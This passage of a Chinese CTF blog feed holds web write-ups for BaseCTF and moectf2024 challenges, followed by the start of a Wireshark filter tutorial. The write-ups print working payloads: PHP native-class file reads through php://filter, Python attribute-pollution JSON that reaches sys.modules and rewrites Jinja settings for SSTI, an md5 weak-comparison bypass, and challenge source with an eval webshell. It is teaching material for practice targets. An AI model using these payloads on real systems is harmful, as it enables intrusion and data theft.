class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>放入cookie刷新几次，查看upload文件夹时就会发现文件名已经被更改了</p><p>蚁剑直接连</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basectf</title>
    <link href="/2024/09/18/%E6%AF%94%E8%B5%9B/Basectf/"/>
    <url>/2024/09/18/%E6%AF%94%E8%B5%9B/Basectf/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>\<span class="hljs-comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$J1ng</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;J&#x27;</span>];<br><span class="hljs-variable">$Hong</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>];<br><span class="hljs-variable">$Keng</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;K&#x27;</span>];<br><span class="hljs-variable">$Wang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;W&#x27;</span>];<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$Keng</span>(<span class="hljs-variable">$Wang</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$J1ng</span>(<span class="hljs-variable">$Hong</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>$Keng：这里我们使用 PHP 内置的 <code>DirectoryIterator</code> 类来遍历目录。</p><p>$Wang：指定要遍历的目录为 <code>/secret</code>。</p><p>$foreach循环：遍历 <code>$dir</code>，并输出每个文件的名称。</p><p>找到flag在&#x2F;secret文件夹的f11444g.php</p><p>使用 <code>SplFileObject </code>类读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?K=DirectoryIterator&amp;W=/secret<br><br>J=SplFileObject&amp;H=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/secret/</span>f11444g.php<br></code></pre></td></tr></table></figure><h2 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h2><h3 id="JinjaMark"><a href="#JinjaMark" class="headerlink" title="JinjaMark"></a>JinjaMark</h3><p>两个路由，一个是&#x2F;index，一个是&#x2F;flag。</p><p>前往&#x2F;flag，用bp爆破出幸运数字然后上传会得到部分源码，根据源码可知在&#x2F;magic路由下可以进行原型链污染以及&#x2F;index中存在的黑名单。</p><p>在&#x2F;magic路由下污染jinja的语法标识符，将”,“修改为”&lt;&lt;”,”&gt;&gt;”或者其他不影响ssti注入的符号</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;app&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;jinja_env&quot;</span> <span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;variable_start_string&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;&lt;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;variable_end_string&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&gt;&gt;&quot;</span><br><span class="hljs-punctuation">&#125;</span>        <br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>传入后去&#x2F;index进行无过滤的ssti注入即可</p><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>\<span class="hljs-comment"># 我记得她...好像叫flag.php吧？</span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];<br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)<br>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你不是hacker？那请去外场等候！&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你是hacker还敢自报家门呢？&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514到底是啥意思嘞？。？&quot;</span>);<br>&#125;<br>\<span class="hljs-comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">e[m.p=<span class="hljs-number">114514.1</span><span class="hljs-variable">&amp;a</span>=SplFileObject<span class="hljs-variable">&amp;b</span>=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&quot;</span><br><br><span class="hljs-attr">data</span> <span class="hljs-operator">=</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-string">&quot;try&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>*<span class="hljs-number">1000001</span>+<span class="hljs-string">&quot;HACKER&quot;</span><span class="hljs-punctuation">&#125;</span>)<br></code></pre></td></tr></table></figure><h3 id="lucky-number"><a href="#lucky-number" class="headerlink" title="lucky_number"></a>lucky_number</h3><p>前往**&#x2F;flag**，可以得到部分源码以及提示。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs json">from flask import Flask<span class="hljs-punctuation">,</span>request<span class="hljs-punctuation">,</span>render_template_string<span class="hljs-punctuation">,</span>render_template<br>from jinja2 import Template<br>import json<br>import heaven<br>def merge(src<span class="hljs-punctuation">,</span> dst)<span class="hljs-punctuation">:</span><br>    for k<span class="hljs-punctuation">,</span> v in src.items()<span class="hljs-punctuation">:</span><br>        if hasattr(dst<span class="hljs-punctuation">,</span> &#x27;__getitem__&#x27;)<span class="hljs-punctuation">:</span><br>            if dst.get(k) and type(v) == dict<span class="hljs-punctuation">:</span><br>                merge(v<span class="hljs-punctuation">,</span> dst.get(k))<br>            else<span class="hljs-punctuation">:</span><br>                dst<span class="hljs-punctuation">[</span>k<span class="hljs-punctuation">]</span> = v<br>        elif hasattr(dst<span class="hljs-punctuation">,</span> k) and type(v) == dict<span class="hljs-punctuation">:</span><br>            merge(v<span class="hljs-punctuation">,</span> getattr(dst<span class="hljs-punctuation">,</span> k))<br>        else<span class="hljs-punctuation">:</span><br>            setattr(dst<span class="hljs-punctuation">,</span> k<span class="hljs-punctuation">,</span> v)<br><br>class cls()<span class="hljs-punctuation">:</span><br>    def __init__(self)<span class="hljs-punctuation">:</span><br>        pass<br><br>instance = cls()<br><br>BLACKLIST_IN_index = <span class="hljs-punctuation">[</span>&#x27;<span class="hljs-punctuation">&#123;</span>&#x27;<span class="hljs-punctuation">,</span>&#x27;<span class="hljs-punctuation">&#125;</span>&#x27;<span class="hljs-punctuation">]</span><br>def is_json(data)<span class="hljs-punctuation">:</span><br>    try<span class="hljs-punctuation">:</span><br>        json.loads(data)<br>        return True<br>    except ValueError<span class="hljs-punctuation">:</span><br>        return False<br><br>@app.route(&#x27;/m4G1c&#x27;<span class="hljs-punctuation">,</span>methods=<span class="hljs-punctuation">[</span>&#x27;POST&#x27;<span class="hljs-punctuation">,</span> &#x27;GET&#x27;<span class="hljs-punctuation">]</span>)<br>def pollute()<span class="hljs-punctuation">:</span><br>    if request.method == &#x27;POST&#x27;<span class="hljs-punctuation">:</span><br>        if request.is_json<span class="hljs-punctuation">:</span><br>            merge(json.loads(request.data)<span class="hljs-punctuation">,</span> instance)<br>            result = heaven.create()<br>            message = result<span class="hljs-punctuation">[</span><span class="hljs-string">&quot;message&quot;</span><span class="hljs-punctuation">]</span><br>            return <span class="hljs-string">&quot;这个魔术还行吧</span><br><span class="hljs-string">&quot;</span> + message<br>        else<span class="hljs-punctuation">:</span><br>            return <span class="hljs-string">&quot;我要json的魔术&quot;</span><br>    return <span class="hljs-string">&quot;记得用POST方法把魔术交上来&quot;</span><br><br><br>#heaven.py<br><br>def create(kon=<span class="hljs-string">&quot;Kon&quot;</span><span class="hljs-punctuation">,</span> pure=<span class="hljs-string">&quot;Pure&quot;</span><span class="hljs-punctuation">,</span> *<span class="hljs-punctuation">,</span> confirm=False)<span class="hljs-punctuation">:</span><br>    if confirm and <span class="hljs-string">&quot;lucky_number&quot;</span> not in create.__kwdefaults__<span class="hljs-punctuation">:</span><br>        return <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lucky_number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;nope&quot;</span><span class="hljs-punctuation">&#125;</span><br>    if confirm and <span class="hljs-string">&quot;lucky_number&quot;</span> in create.__kwdefaults__<span class="hljs-punctuation">:</span><br>        return <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lucky_number&quot;</span><span class="hljs-punctuation">:</span> create.__kwdefaults__<span class="hljs-punctuation">[</span><span class="hljs-string">&quot;lucky_number&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br><br>    return <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你有什么想创造的吗？&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;lucky_number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;nope&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>根据代码可知在**&#x2F;m4G1c<strong>路由下存在着导致原型链污染的</strong>merge<strong>函数，再结合其它提示可知此处是要污染</strong>heaven.py<strong>的</strong>create<strong>函数的</strong><strong>kwdefaults</strong><strong>属性，该属性存储的是仅关键字参数，即位于</strong><em><strong>之后的参数。由于</strong>create</em><em>函数在另一个模块中，我们需要利用<strong>sys</strong>模块的<strong>modules</strong>属性来获取到<strong>heaven.py</strong>，但是代码中并没有导入<strong>sys</strong>模块。那么该怎么获取到这个模块呢？在python中存在着*</em><strong>spec</strong><strong>内置属性，包含了关于类加载时的信息，定义在Lib&#x2F;importlib&#x2F;_bootstrap.py的类ModuleSpec，所以可以直接采用</strong>&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]**获取到sys模块，此处就可以使用json模块获取，最终的payload如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;json&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;__spec__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;__init__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;__globals__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;sys&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;modules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;heaven&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;create&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;__kwdefaults__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                              <span class="hljs-attr">&quot;confirm&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                              <span class="hljs-attr">&quot;lucky_number&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5346&quot;</span><br>                                             <span class="hljs-punctuation">&#125;</span> <br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">&#125;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在**&#x2F;m4G1c<strong>传入该payload之后，根据回显可知要前往&#x2F;check，前往查看之后发现污染成功，可以直接前往</strong>&#x2F;ssSstTti1** 进行无过滤的ssti注入，前往注入即可</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2024</title>
    <link href="/2024/09/11/%E6%AF%94%E8%B5%9B/moectf2024/"/>
    <url>/2024/09/11/%E6%AF%94%E8%B5%9B/moectf2024/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h2><p>抓包发现提示final1l1l_challenge.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;final1l1l_challenge.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;noooooooooooo&#x27;</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Notice the param type!&#x27;</span>);<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Where is your param?&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>弱比较PHP会进行隐式的类型转换，字符串将被转换为一个数字</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=QNKCDZO<br><br><span class="hljs-attribute">b</span>=0a<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>流量分析</title>
    <link href="/2024/07/29/web%E5%AD%A6%E4%B9%A0/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/29/web%E5%AD%A6%E4%B9%A0/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="（1）数据包筛选："><a href="#（1）数据包筛选：" class="headerlink" title="（1）数据包筛选："></a>（1）数据包筛选：</h3><p>Wireshark的数据包筛选功能是wireshark的核心功能，比如需要筛选出特定的协议如HTTP，Telnet等，<br>也可能需要筛选出ip地址，端口等，多条规则可以使用&amp;&amp;，|| 连接.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#ip筛选：</span><br><span class="hljs-attr">ip.src</span> == 地址         <span class="hljs-comment">#源ip筛选</span><br><span class="hljs-attr">ip.dst</span> == 地址         <span class="hljs-comment">#目的ip筛选</span><br><span class="hljs-attr">ip.addr</span> == 地址          <span class="hljs-comment">#ip筛选</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#mac地址筛选：</span><br><span class="hljs-attribute">eth</span>.dst == A0:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span>:C5:<span class="hljs-number">84</span>         #目标mac地址筛选<br><span class="hljs-attribute">eth</span>.addr == <span class="hljs-number">20</span>:<span class="hljs-number">89</span>:<span class="hljs-number">84</span>:<span class="hljs-number">32</span>:<span class="hljs-number">73</span>:c5        #mac地址筛选<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#端口筛选：</span><br><span class="hljs-attr">tcp.dstport</span> == <span class="hljs-number">80</span>        <span class="hljs-comment">#筛选tcp协议的目标端口为80的流量包</span><br><span class="hljs-attr">tcp.srcport</span> == <span class="hljs-number">80</span>        <span class="hljs-comment">#筛选tcp协议的源端口为80的流量包</span><br><span class="hljs-attr">udp.srcport</span> == <span class="hljs-number">80</span>        <span class="hljs-comment">#筛选udp协议的源端口为80的流量包</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#协议筛选：</span><br>tcp         <span class="hljs-comment">#筛选协议为tcp的流量包</span><br>udp         <span class="hljs-comment">#筛选协议为udp的流量包</span><br>arp<span class="hljs-regexp">/icmp/</span>http<span class="hljs-regexp">/ftp/</span>dns<span class="hljs-regexp">/ip     #筛选协议为arp/i</span>cmp<span class="hljs-regexp">/http/</span>ftp<span class="hljs-regexp">/dns/i</span>p的流量包<br>                         <span class="hljs-comment">#可用!加协议或者not加协议表示排除该协议not arp 或!arp</span><br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#包长度筛选：</span><br><br>udp.<span class="hljs-built_in">length</span> ==<span class="hljs-number">20</span>     <span class="hljs-comment">#筛选长度为20的udp流量包 这个长度是指udp本身固定长度8加上udp下面那块</span><br>数据包之和<br><br>tcp.<span class="hljs-built_in">len</span> &gt;=<span class="hljs-number">20</span>     <span class="hljs-comment">#筛选长度大于20的tcp流量包 指的是ip数据包(tcp下面那块数据),不包括tcp本身</span><br><br>ip.<span class="hljs-built_in">len</span> ==<span class="hljs-number">20</span>    <span class="hljs-comment">#筛选长度为20的IP流量包 除了以太网头固定长度14,其它都算是i.en,即i本身到最后</span><br><br>frame.<span class="hljs-built_in">len</span> ==<span class="hljs-number">2</span>     <span class="hljs-comment">#筛选长度为20的整个流量包 整个数据包长度从eth开始到最后</span><br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#http请求筛选：</span><br>GET:httprequest.method==<span class="hljs-string">&quot;GET&quot;</span>  <span class="hljs-comment">#筛选HTTP请求方法为GET的流量包</span><br><br>POST:<span 